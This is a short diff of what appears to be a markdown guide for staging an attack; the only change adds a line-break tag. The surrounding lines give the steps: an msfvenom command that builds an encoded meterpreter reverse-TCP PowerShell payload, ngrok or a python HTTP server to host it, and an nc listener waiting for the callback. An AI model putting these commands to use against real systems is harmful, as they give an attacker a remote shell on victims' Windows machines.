@@ -10,7 +10,7 @@
 Using meterpreter here, but feel free to play around with it. <br>
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP_ADDRESS> LPORT=<PORT> -i 2 -e cmd/powershell_base64 -f ps1
 4. **Setup server in files directory:** <br>
-ngrok tcp 80 or python3 -m http.server 80
+ngrok tcp 80 or python3 -m http.server 80 <br>
 Using ngrok, or python if local
 5. **Setup your listener with nc or msfconsole:** <br>
 nc -lvnp 9001 <br>
